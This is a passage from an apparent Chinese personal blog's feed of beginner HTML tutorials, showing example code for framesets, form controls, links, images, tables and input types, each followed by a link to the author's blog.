    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="框架frame使用截图样式"><a href="#框架frame使用截图样式" class="headerlink" title="框架frame使用截图样式"></a>框架frame使用截图样式</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707164005440.png" alt="image-20210707164005440"></p>
<h1 id="框架frame使用代码"><a href="#框架frame使用代码" class="headerlink" title="框架frame使用代码"></a>框架frame使用代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>框架<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">frameset</span> <span class="attr">rows</span>=<span class="string">"30%,*"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"list.html"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">"30%,*"</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"select.html"</span>/&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"select.html"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>list的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】选择框、复选框、单选框、文本域</title>
    <url>/2021/07/07/%E3%80%90HTML%E3%80%91%E9%80%89%E6%8B%A9%E6%A1%86%E3%80%81%E5%A4%8D%E9%80%89%E6%A1%86%E3%80%81%E5%8D%95%E9%80%89%E6%A1%86%E3%80%81%E6%96%87%E6%9C%AC%E5%9F%9F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="选择框、复选框、单选框、文本域的截图"><a href="#选择框、复选框、单选框、文本域的截图" class="headerlink" title="选择框、复选框、单选框、文本域的截图"></a>选择框、复选框、单选框、文本域的截图</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707160419908.png" alt="image-20210707160419908"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>选择框、复选框、单选框、文本域<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--表单 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">legend</span>&gt;</span>个人信息<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"application/x-www-form-urlencoded"</span>&gt;</span></span><br><span class="line">		用户名<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--单选框--&gt;</span></span><br><span class="line">		性别</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"1"</span> /&gt;</span>男</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"2"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>/&gt;</span>女 <span class="comment">&lt;!--默认选择checked--&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--多选框--&gt;</span></span><br><span class="line">		喜欢语言</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"asp"</span>&gt;</span>asp</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"aspx"</span>&gt;</span>aspx</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"app[]"</span> <span class="attr">value</span>=<span class="string">"php"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span>php</span><br><span class="line">		<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">&lt;!--选择框--&gt;</span></span><br><span class="line">		地区<span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"address"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"shanghai"</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"wuhan"</span> &gt;</span>武汉<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">&lt;!--文本域--&gt;</span></span><br><span class="line">		简介<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"30"</span> <span class="attr">rows</span>=<span class="string">"10"</span> <span class="attr">name</span>=<span class="string">"info"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】a标签，src标签，table标签使用</title>
    <url>/2021/07/07/%E3%80%90HTML%E3%80%91a%E6%A0%87%E7%AD%BE%EF%BC%8Csrc%E6%A0%87%E7%AD%BE%EF%BC%8Ctable%E6%A0%87%E7%AD%BE%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="标签使用截图样式"><a href="#标签使用截图样式" class="headerlink" title="标签使用截图样式"></a>标签使用截图样式</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707151958897.png" alt="image-20210707151958897"></p>
<h1 id="标签使用代码及注释"><a href="#标签使用代码及注释" class="headerlink" title="标签使用代码及注释"></a>标签使用代码及注释</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>a标签，src标签，table标签使用<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用  target中 _self代表不新建标签、_blank新建页面跳转--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gylq.github.io/"</span> <span class="attr">target</span>=<span class="string">"_self"</span>&gt;</span>孤桜懒契的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://gylq.github.io/"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>孤桜懒契的博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--img标签的使用 alt当图片不存在描述图片--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1.jpg"</span> <span class="attr">alt</span>=<span class="string">"qq图片"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--表格tr代表一行，th单元格数据加粗 ，td一个单元格的数据,borden边框，cellpadding单元格大小，单元格间距cellspacing，colspan行单元格拼接，竖单元格拼接rowspan--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"10"</span> <span class="attr">cellspacing</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>名字<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>刘备<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>张飞<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>关羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>总数<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>3人<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"10"</span> <span class="attr">cellspacing</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>名字<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>刘备<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>11<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>2<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>张飞<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>22<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>3<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>关羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>33<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>4<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>小羽<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--a 标签的使用  top返回最上面--&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">"top"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>https://gylq.github.io/<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#top"</span>&gt;</span>返回头部<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>标签的使用</tag>
      </tags>
  </entry>
  <entry>
    <title>【HTML】Form表单中Input的使用</title>
    <url>/2021/07/07/%E3%80%90HTML%E3%80%91Form%E8%A1%A8%E5%8D%95%E4%B8%ADInput%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="form表单截图样式"><a href="#form表单截图样式" class="headerlink" title="form表单截图样式"></a>form表单截图样式</h1><p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210707144322530.png" alt="image-20210707144322530"></p>
<h1 id="form表单中input"><a href="#form表单中input" class="headerlink" title="form表单中input"></a>form表单中input</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span>  <span class="comment">&lt;!--字符集 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>form表单和input<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--表单POST传参 --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--value：默认值 maxlength：最大长度限制 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"initial-scale"</span>&gt;</span>  </span><br><span class="line">		账号：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">value</span>=<span class="string">"admin"</span> <span class="attr">readonly</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span> </span><br><span class="line">		密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">size</span>=<span class="string">"30"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">			<span class="comment">&lt;!--hidden隐藏域 --&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"token"</span> <span class="attr">value</span>=<span class="string">"waffawafaw"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">value</span>=<span class="string">"重置"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--文件上传模式 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--button文件上传模式 --&gt;</span>		</span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!--搜索模式 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>  </span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"seach"</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"搜索"</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>html</tag>
        <tag>input</tag>
        <tag>Form</tag>
      </tags>
  </entry>
  <entry>
    <title>【小知识】windows中java同时两个版本java8和java16混用</title>
    <url>/2021/07/05/%E3%80%90%E5%B0%8F%E7%9F%A5%E8%AF%86%E3%80%91windows%E4%B8%ADjava%E5%90%8C%E6%97%B6%E4%B8%A4%E4%B8%AA%E7%89%88%E6%9C%ACjava8%E5%92%8Cjava16%E6%B7%B7%E7%94%A8/</url>
